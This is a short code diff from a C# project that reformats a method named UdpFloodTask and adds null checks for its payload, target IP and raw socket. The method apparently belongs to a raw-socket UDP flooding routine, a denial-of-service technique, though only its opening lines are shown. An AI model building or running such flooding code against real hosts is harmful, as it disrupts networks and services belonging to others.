@@ -149,8 +149,19 @@ namespace TestOCSP
 
         } // End Sub Test 
 
-        static async System.Threading.Tasks.Task UdpFloodTask(System.Threading.CancellationToken cancellationToken)
+        static async System.Threading.Tasks.Task UdpFloodTask(
+            System.Threading.CancellationToken cancellationToken
+        )
         {
+            if (payload == null)
+                throw new System.NullReferenceException(nameof(payload));
+
+            if (targetIp == null)
+                throw new System.NullReferenceException(nameof(targetIp));
+
+            if(rawSocket == null)
+                throw new System.NullReferenceException(nameof(rawSocket));
+
             System.Random rand = new System.Random();
             byte[] dataBytes = System.Text.Encoding.ASCII.GetBytes(payload);
             int udpHeaderSize = System.Runtime.InteropServices.Marshal.SizeOf(typeof(udphdr_cs));
